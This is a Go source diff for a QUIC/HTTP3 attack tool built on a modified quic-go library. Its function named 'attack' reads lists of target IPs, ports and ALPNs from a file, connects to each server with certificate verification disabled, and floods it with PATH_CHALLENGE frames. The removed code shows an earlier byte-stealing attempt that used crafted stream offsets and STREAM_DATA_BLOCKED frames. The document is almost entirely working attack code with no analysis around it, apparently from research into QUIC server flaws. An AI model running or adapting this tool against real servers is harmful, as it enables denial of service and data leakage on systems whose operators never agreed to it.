@@ -9,6 +9,7 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/pem"
+	"flag"
 	"fmt"
 	"io"
 	"log"
@@ -16,6 +17,7 @@ import (
 	"net"
 	"os"
 	"strconv"
+	"sync"
 	"time"
 
 	"github.com/k4ra5u/quic-go"
@@ -64,7 +66,8 @@ func main() {
 	//go func() { log.Fatal(echoServer()) }()
 
 	//keyLogFile := "C:\\Users\\13298\\Desktop\\key.log"
-	keyLogFile := "/home/john/Desktop/key.log"
+	keyLogFile := "/home/john/Desktop/cjj_related/key.log"
+	//keyLogFile := "/mnt/hgfs/work/key.log"
 
 	if len(keyLogFile) > 0 {
 		f, err := os.Create(keyLogFile)
@@ -74,26 +77,13 @@ func main() {
 		defer f.Close()
 		keyLog = f
 	}
-
-	args := []string{"localhost", "127.0.0.1"}
-	if len(args) != 2 {
-		log.Fatalf("usage: %v <domain> <ip>", os.Args[0])
-	}
-	targetAddr := args[1]
-	if _, _, err := net.SplitHostPort(targetAddr); err != nil {
-		targetAddr = net.JoinHostPort(targetAddr, "8081")
-	}
-	serverName := args[0]
+	serverName := "alternate.localhost.examp1e.net"
 	println(serverName)
-
-	prefix := []byte("")
-	suffix := []byte("")
-	stealBytes := 20000
 
 	req := &HTTPMessage{
 		Headers: []Header{
-			{":method", "POST"},
-			{":path", "/demo/echo"},
+			{":method", "GET"},
+			{":path", "/index.html"},
 			{":authority", serverName},
 			{":scheme", "https"},
 			{"user-agent", "Mozilla/5.0"},
@@ -101,58 +91,160 @@ func main() {
 		Body: nil,
 	}
 
-	resp, err := attack(targetAddr, serverName, req, prefix, suffix, stealBytes)
-	if err != nil {
-		log.Fatalf("Error: %#v", err)
+	//args := []string{"alternate.localhost.examp1e.net", "192.168.132.1"}
+	//args := []string{"alternate.localhost.examp1e.net", "117.33.164.64"}
+	target_file := flag.String("f", "", "input file")
+	target_addr := flag.String("i", "", "IP")
+	target_port := flag.String("p", "", "PORT")
+	target_alpn := flag.String("a", "", "ALPN")
+
+	flag.Usage = func() {
+		flag.PrintDefaults()
 	}
 
-	for _, h := range resp.Headers {
-		fmt.Printf("%v: %v\n", h.Name, h.Value)
+	flag.Parse()
+
+	if *target_file == "" && (*target_addr == "" || *target_port == "" || *target_alpn == "") {
+		flag.Usage()
+		return
+	}
+
+	if *target_file == "" {
+		targetAddr := *target_addr
+		targetPort := *target_port
+		targetAlpn := *target_alpn
+
+		if _, _, err := net.SplitHostPort(targetAddr); err != nil {
+			targetAddr = net.JoinHostPort(targetAddr, targetPort)
+		}
+		var wg sync.WaitGroup
+		wg.Add(1)
+		resp, err := attack(targetAddr, serverName, req, targetAlpn, &wg)
+		if err != nil {
+			log.Fatalf("Error: %#v", err)
+		}
+		if resp != nil {
+			for _, h := range resp.Headers {
+				fmt.Printf("%v: %v\n", h.Name, h.Value)
+			}
+		}
+
+	} else {
+		Content, ferr := os.ReadFile(*target_file)
+		if ferr != nil {
+			fmt.Errorf("invalid file : %w", ferr)
+			return
+		}
+		ips := [...]string{}
+		ipSlice := ips[:]
+		ports := [...]string{}
+		portSlice := ports[:]
+		alpns := [...]string{}
+		alpnSlice := alpns[:]
+
+		file_contents := bytes.Split(Content, []byte("\n"))
+		length := len(file_contents)
+		log.Println("Total %d items\n", length)
+
+		for _, file_content := range file_contents {
+			contents := bytes.Split(file_content, []byte(" "))
+			ipSlice = append(ipSlice, string(contents[0]))
+			portSlice = append(portSlice, string(contents[1]))
+			alpnSlice = append(alpnSlice, string(contents[2]))
+		}
+		var wg sync.WaitGroup
+		//results := make(chan *HTTPMessage)
+		/*
+			for i := 0; i < length; i++ {
+				thisIP := ipSlice[i]
+				thisPort := portSlice[i]
+				thisAlpn := alpnSlice[i]
+				if _, _, err := net.SplitHostPort(thisIP); err != nil {
+					targetAddr := net.JoinHostPort(thisIP, thisPort)
+
+					go func(id int) {
+						//log.Printf("handling %s", targetAddr)
+						try_failed := 1
+						for j := 0; j < 1; j++ {
+							wg.Add(1)
+							_, err := attack(targetAddr, serverName, req, thisAlpn, &wg)
+							if err == nil {
+								break
+							}
+							//log.Printf("%s:%s", targetAddr, err.Error())
+							try_failed -= 1
+						}
+						if try_failed == 0 {
+							log.Printf("failed:%s %s %s", thisIP, thisPort, thisAlpn)
+						}
+					}(i)
+					time.Sleep(time.Millisecond * 100)
+				}
+			}
+		*/
+		for i := 0; i < length; i++ {
+			thisIP := ipSlice[i]
+			thisPort := portSlice[i]
+			thisAlpn := alpnSlice[i]
+			if _, _, err := net.SplitHostPort(thisIP); err != nil {
+				targetAddr := net.JoinHostPort(thisIP, thisPort)
+
+				//log.Printf("handling %s", targetAddr)
+				try_failed := 1
+				for j := 0; j < 1; j++ {
+					wg.Add(1)
+					_, err := attack(targetAddr, serverName, req, thisAlpn, &wg)
+					if err == nil {
+						break
+					}
+					//log.Printf("%s:%s", targetAddr, err.Error())
+					try_failed -= 1
+				}
+				if try_failed == 0 {
+					log.Printf("failed:%s %s %s", thisIP, thisPort, thisAlpn)
+				}
+			}
+		}
+		//wg.Wait()
+		log.Printf("All workers have finished, exiting the program.")
 	}
 	//fmt.Println()
 	//fmt.Printf("%s\n", resp.Body)
 }
 
-func attack(connectAddr, serverName string, request *HTTPMessage, prefix, suffix []byte, stealBytes int) (response *HTTPMessage, err error) {
-	//flushSize := 16879669
-	//flushSize := 1024 * 4
-	//flushSize := 1024 * 100
-	flushSize := 984575 - 4000
-	//33601296
+func attack(connectAddr, serverName string, request *HTTPMessage, targetAlpn string, wg *sync.WaitGroup) (response *HTTPMessage, err error) {
+	defer func() {
+		wg.Done()
+		//log.Printf("%s:ended", connectAddr)
+	}()
 
-	if len(prefix) >= flushSize {
-		return nil, fmt.Errorf("len(prefix) > %v", flushSize)
-	}
-	if len(suffix) > 1000 {
-		return nil, fmt.Errorf("len(suffix) > 1000")
-	}
-
+	flushSize := 1024 * 4
 	address := connectAddr
-	if _, _, err := net.SplitHostPort(connectAddr); err != nil {
-		address = net.JoinHostPort(address, "6121")
-	}
-
 	name, port, err := net.SplitHostPort(address)
 	if err != nil {
+		//log.Printf("aaaaa")
 		return nil, fmt.Errorf("invalid address %v: %w", address, err)
 	}
 
 	ip, err := net.LookupIP(name)
 	if err != nil {
+		//log.Printf("bbbbb")
 		return nil, fmt.Errorf("lookup for %v failed: %w", name, err)
 	}
 	portInt, err := strconv.Atoi(port)
 	if err != nil {
+		//log.Printf("ccccc")
 		return nil, fmt.Errorf("invalid port: %w", err)
 	}
 
 	udpConn, err := net.ListenPacket("udp", ":0")
 	if err != nil {
+		//log.Printf("eeeee")
 		return nil, err
 	}
 	defer func() { _ = udpConn.Close() }()
 
-	ctx, cancel := context.WithTimeout(context.Background(), 1000*time.Second)
+	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
 	defer cancel()
 	go func() {
 		<-ctx.Done()
@@ -166,7 +258,9 @@ func attack(connectAddr, serverName string, request *HTTPMessage, prefix, suffix
 
 	session, err := quic.Dial(ctx, udpConn, udpAddr,
 		&tls.Config{
-			NextProtos:         []string{"h3"},
+			//NextProtos: []string{"hq-interop"},
+			NextProtos:         []string{targetAlpn},
+			ServerName:         serverName,
 			InsecureSkipVerify: true,
 			KeyLogWriter:       keyLog,
 		},
@@ -176,44 +270,36 @@ func attack(connectAddr, serverName string, request *HTTPMessage, prefix, suffix
 		})
 
 	if err != nil {
+		//log.Printf("%s:%s", connectAddr, err.Error())
 		return nil, err
 	}
 
 	defer func() { _ = session.CloseWithError(0, "") }()
 
 	if err := setupSession(session); err != nil {
+		//log.Printf("ggggg%s", err.Error())
 		return nil, err
 	}
 
 	requestStream, err := session.OpenStream()
 	if err != nil {
+		//log.Printf("hhhhh%s", err.Error())
 		return nil, err
 	}
+	//log.Printf("%s:frames with headers and prefix sending", connectAddr)
 
 	//构造前序的数据包：1024*100
 	firstRange := bytes.NewBuffer(nil)
 	requestHeaders := request.Headers
 	requestHeaders = append(requestHeaders, Header{
 		Name:  "content-length",
-		Value: strconv.Itoa(flushSize + stealBytes + len(suffix) + 1),
+		Value: strconv.Itoa(flushSize + 138041),
 	})
 	//firstRange.Write(encodeHeaders(requestHeaders))
-	//firstRange.Write(encodeBodyHeader(flushSize))
-	//firstRange.Write(prefix)
-	firstRange.Write(bytes.Repeat([]byte("A"), flushSize-len(prefix)-1))
+	firstRange.Write(bytes.Repeat([]byte("A"), flushSize-1))
 
-	//stolenBytesWithSuffix := stealBytes + len(suffix) + 1
-	//flushFrameContent := append([]byte("L"), encodeBodyHeader(stolenBytesWithSuffix)...)
-	flushFrameContent := bytes.Repeat([]byte("A"), 1024)
-	finFrameContent := append([]byte("S"), suffix...)
-
-	flushByteOffset := firstRange.Len()
-	//flushByteOffset = 1308254
-	flushByteOffset = 2680
-	firstStolenByteOffset := flushByteOffset + len(flushFrameContent)
-	finFrameOffset := firstStolenByteOffset + stealBytes + 1308254
-	totalSize := finFrameOffset + len(finFrameContent)
-	totalSize = totalSize + 1
+	finFrameContent := bytes.Repeat([]byte("S"), 0)
+	finFrameOffset := firstRange.Len() + len(finFrameContent)
 
 	finFrame := &wire.StreamFrame{
 		StreamID:       0,
@@ -223,260 +309,62 @@ func attack(connectAddr, serverName string, request *HTTPMessage, prefix, suffix
 		DataLenPresent: true,
 	}
 
-	blocked_frame := &wire.StreamDataBlockedFrame{
-		StreamID:          0,
-		MaximumStreamData: 984575,
-	}
-	frames := []wire.Frame{
-		blocked_frame,
-		//flushFrame,
-		//finFrame,
-		//resetFrame,
-	}
-	/*
-		resetFrame := &wire.ResetStreamFrame{
-			StreamID:  0,
-			ErrorCode: 0,
-			FinalSize: protocol.ByteCount(totalSize),
-		}
-		reset_frame := []wire.Frame{
-			resetFrame,
-		}
-	*/
 	fin_frame := []wire.Frame{
 		finFrame,
 	}
 
-	//send first padding bytes
-	//发送前序的数据包：1024*100
 	_, _ = requestStream.Write(firstRange.Bytes())
-	//log.Printf(hex.EncodeToString(firstRange.Bytes()))
-	log.Printf("frames with headers and prefix sent")
-	time.Sleep(time.Second)
-	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(frames)
-	var (
-		headers Headers
-		body    []byte
-	)
 
-	//发送第一个STRAM_DATA_BLOCKED
-	blocked_frame = &wire.StreamDataBlockedFrame{
-		StreamID:          0,
-		MaximumStreamData: 984575,
-	}
-	frames = []wire.Frame{
-		blocked_frame,
-	}
-	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(frames)
-	time.Sleep(time.Second)
-
-	//发送一个固定偏移的包，之后发送STREAM_DATA_BLOCKED
-	//每次发包的偏移都不同，还没写好
-	/*
-		for i := 0; i < 1; i++ {
-
-			flushByteOffset = 204852
-			flushFrame := &wire.StreamFrame{
-				StreamID:       0,
-				Offset:         protocol.ByteCount(flushByteOffset),
-				Data:           flushFrameContent,
-				Fin:            false,
-				DataLenPresent: true,
-			}
-			flush_frame := []wire.Frame{
-				flushFrame,
-			}
-			//send jumped bytes
-			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(flush_frame)
-			time.Sleep(time.Second)
-
-			//发送第一个STRAM_DATA_BLOCKED
-			blocked_frame = &wire.StreamDataBlockedFrame{
-				StreamID:          0,
-				MaximumStreamData: 524288,
-			}
-			frames = []wire.Frame{
-				blocked_frame,
-			}
-			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(frames)
-			time.Sleep(time.Second)
-
-		}
-	*/
-
-	//发送第二轮：在1048576-10240的位置发送1024个字节
-	//time.Sleep(time.Second * 25)
-	startPos := 1308254 - 10240
-	for i := 0; i < 10; i++ {
-		flushFrame := &wire.StreamFrame{
-			StreamID:       0,
-			Offset:         protocol.ByteCount(startPos),
-			Data:           flushFrameContent,
-			Fin:            false,
-			DataLenPresent: true,
-		}
-		flush_frame := []wire.Frame{
-			flushFrame,
-		}
-		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(flush_frame)
-		startPos += 1024
-	}
-
-	time.Sleep(time.Second)
-
-	//发送第二轮：发送1308254偏移的STREAM_DATA_BLOCKED
-	blocked_frame = &wire.StreamDataBlockedFrame{
-		StreamID:          0,
-		MaximumStreamData: 1308252,
-	}
-	frames = []wire.Frame{
-		blocked_frame,
-	}
-
-	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(frames)
-
-	//发送PATH_CHALLENGE帧
 	randomBytes := make([]byte, 8)
 
-	//time.Sleep(time.Microsecond * 800000)
+	for i := 0; i < 1000; i++ {
 
-	for i := 0; i < 5727000; i++ {
-		rand.Read(randomBytes)
-		var randomBytesArray [8]byte
-		copy(randomBytesArray[:], randomBytes)
-		path_challengeFrame := &wire.PathChallengeFrame{
-			Data: randomBytesArray,
+		var path_challenge_frame []wire.Frame
+
+		//padding = []byte(bytes.Repeat([]byte("\x00"), 200))
+		for j := 0; j < 10; j++ {
+			rand.Read(randomBytes)
+			var randomBytesArray [8]byte
+			copy(randomBytesArray[:], randomBytes)
+			padding := []byte(bytes.Repeat([]byte("\x00"), 1172))
+			padding = []byte("")
+			path_challengeFrame := &wire.PathChallengeFrame{
+				Data:    randomBytesArray,
+				Padding: padding,
+			}
+			path_challenge_frame = append(path_challenge_frame, path_challengeFrame)
+
 		}
-		path_challenge_frame := []wire.Frame{
-			path_challengeFrame,
-		}
+
 		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
-		time.Sleep(time.Microsecond * 10)
+		time.Sleep(time.Millisecond * 1)
 	}
-
 	/*
-
-		//发送ping帧
-		ping_frame := &wire.PingFrame{}
-		pingFrame := []wire.Frame{
-			ping_frame,
+		for i := 0; i < 1000; i++ {
+			rand.Read(randomBytes)
+			var randomBytesArray [8]byte
+			copy(randomBytesArray[:], randomBytes)
+			padding := []byte(bytes.Repeat([]byte("\x00"), 1172))
+			padding = []byte("")
+			//padding = []byte(bytes.Repeat([]byte("\x00"), 200))
+			path_challengeFrame := &wire.PathChallengeFrame{
+				Data:    randomBytesArray,
+				Padding: padding,
+			}
+			path_challenge_frame := []wire.Frame{
+				path_challengeFrame,
+			}
+			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
+			time.Sleep(time.Millisecond * 1)
 		}
-		for i := 0; i < 0; i++ {
-			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(pingFrame)
-			time.Sleep(time.Microsecond)
-		}
-
-		ccf := &wire.ConnectionCloseFrame{
-			ErrorCode:          0,
-			ReasonPhrase:       "foobar",
-			IsApplicationError: false,
-		}
-		CCframe := []wire.Frame{
-			ccf,
-			//flushFrame,
-			//finFrame,
-			//resetFrame,
-		}
-		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(CCframe)
 	*/
 
-	/*
-		ConnectionID, _ := protocol.GenerateConnectionIDForInitial()
-		new_CID := &wire.NewConnectionIDFrame{
-			SequenceNumber: uint64(10),
-			//RetirePriorTo:  uint64(1),
-			ConnectionID: ConnectionID,
-			//StatelessResetToken: protocol.StatelessResetToken{0xe, 0xd, 0xc, 0xb, 0xa, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0},
-		}
-		newCID := []wire.Frame{
-			new_CID,
-		}
-		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(newCID)
-		time.Sleep(time.Microsecond)
-	*/
+	time.Sleep(time.Millisecond * 100)
+	//time.Sleep(time.Second * 1)
 
-	//发送size_konwn的stream帧
-	//requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(fin_frame)
-	//time.Sleep(time.Microsecond)
-
-	//requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(reset_frame)
-
-	//发送RETIRE_CONNECTION_ID帧
-
-	//发送第三轮：在1048576-10240的位置发送1024个字节
-	/*
-
-		flushByteOffset = 1048576 - 10240
-		flushFrame := &wire.StreamFrame{
-			StreamID:       0,
-			Offset:         protocol.ByteCount(flushByteOffset),
-			Data:           flushFrameContent,
-			Fin:            false,
-			DataLenPresent: true,
-		}
-		flush_frame := []wire.Frame{
-			flushFrame,
-		}
-		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(flush_frame)
-		time.Sleep(time.Second)
-
-		blocked_frame = &wire.StreamDataBlockedFrame{
-			StreamID:          0,
-			MaximumStreamData: 2048576,
-		}
-		frames = []wire.Frame{
-			blocked_frame,
-		}
-		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(frames)
-
-		//requestStream.Write(firstRange.Bytes())
-		time.Sleep(time.Second)
-	*/
-
-	time.Sleep(time.Second * 20)
 	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(fin_frame)
+	return nil, nil
 
-	decoder := qpack.NewDecoder(func(f qpack.HeaderField) {
-		headers = append(headers, Header{
-			Name:  f.Name,
-			Value: f.Value,
-		})
-	})
-	frameBuffer := bufio.NewReader(requestStream)
-	//frameBuffer = bufio.NewReader(requestStream)
-	for {
-		frame, err := readFrame(frameBuffer)
-		if err != nil {
-			if ctx.Err() != nil {
-				return nil, fmt.Errorf("timeout error")
-			}
-
-			if err == io.EOF {
-				break
-			}
-
-			if qErr, ok := err.(interface{ IsApplicationError() bool }); ok {
-				if qErr.IsApplicationError() {
-					return nil, fmt.Errorf("connection dropped: %v", qErr)
-				}
-			}
-			return nil, err
-		}
-		switch frame.Type {
-		case 0x0:
-			body = append(body, frame.Data...)
-		case 0x1:
-			if _, err := decoder.Write(frame.Data); err != nil {
-				return nil, err
-			}
-		default:
-			// ignore unknown frame types for now
-		}
-	}
-	return &HTTPMessage{
-		Headers: headers,
-		Body:    body,
-	}, nil
 }
 
 type http3Frame struct {
@@ -640,4 +528,108 @@ func generateTLSConfig() *tls.Config {
 		Certificates: []tls.Certificate{tlsCert},
 		NextProtos:   []string{"quic-echo-example"},
 	}
+}
+
+func send_one_req(num int, session quic.Connection, request *HTTPMessage) (response *HTTPMessage, err error) {
+	ctx, _ := context.WithTimeout(context.Background(), 500*time.Second)
+	request_stream, err := session.OpenStreamSync(ctx)
+	request_stream_ID := request_stream.StreamID()
+	if err != nil {
+		return nil, err
+	}
+	firstRange := bytes.NewBuffer(nil)
+	requestHeaders := request.Headers
+	firstRange.Write(encodeHeaders(requestHeaders))
+	//firstRange.Write(bytes.Repeat([]byte("A"), 8392824))
+
+	requestLen := firstRange.Len()
+	finFrame := &wire.StreamFrame{
+		StreamID:       request_stream_ID,
+		Offset:         protocol.ByteCount(requestLen),
+		Data:           nil,
+		Fin:            true,
+		DataLenPresent: true,
+	}
+	fin_frame := []wire.Frame{
+		finFrame,
+	}
+
+	_, _ = request_stream.Write(firstRange.Bytes())
+	/*
+		for i := 1; i < 10; i++ {
+			balanceRange := bytes.NewBuffer(nil)
+			balanceRange.Write(bytes.Repeat([]byte("A"), 750))
+			_, _ = request_stream.Write(balanceRange.Bytes())
+		}
+	*/
+	//log.Printf(hex.EncodeToString(firstRange.Bytes()))
+	//log.Printf("sending %d frames with headers and prefix sent", request_stream_ID)
+
+	request_stream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(fin_frame)
+	var (
+		headers Headers
+		body    []byte
+	)
+	decoder := qpack.NewDecoder(func(f qpack.HeaderField) {
+		headers = append(headers, Header{
+			Name:  f.Name,
+			Value: f.Value,
+		})
+	})
+	frameBuffer := bufio.NewReader(request_stream)
+	//frameBuffer = bufio.NewReader(requestStream)
+	for {
+		//buf, _ := frameBuffer.ReadBytes('\x00')
+		//log.Println(buf)
+		frame, err := readFrame(frameBuffer)
+		if err != nil {
+
+			if err == io.EOF {
+				break
+			}
+
+			if qErr, ok := err.(interface{ IsApplicationError() bool }); ok {
+				if qErr.IsApplicationError() {
+					return nil, fmt.Errorf("connection dropped: %v", qErr)
+				}
+			}
+			return nil, err
+		}
+		switch frame.Type {
+		case 0x0:
+			body = append(body, frame.Data...)
+		case 0x1:
+			if _, err := decoder.Write(frame.Data); err != nil {
+				return nil, err
+			}
+		default:
+			// ignore unknown frame types for now
+		}
+	}
+	log.Println(headers, body)
+
+	resetFrame := &wire.ResetStreamFrame{
+		StreamID:  request_stream_ID,
+		ErrorCode: 6,
+		FinalSize: protocol.ByteCount(requestLen),
+	}
+	reset_frame := []wire.Frame{
+		resetFrame,
+	}
+	stopSendingFrame := &wire.StopSendingFrame{
+		StreamID:  request_stream_ID,
+		ErrorCode: 0x100,
+	}
+	stopSending_frame := []wire.Frame{
+		stopSendingFrame,
+	}
+
+	time.Sleep(time.Microsecond * 100)
+	request_stream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(stopSending_frame)
+	time.Sleep(time.Microsecond * 100)
+	request_stream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(reset_frame)
+	return &HTTPMessage{
+		Headers: headers,
+		Body:    body,
+	}, nil
 }
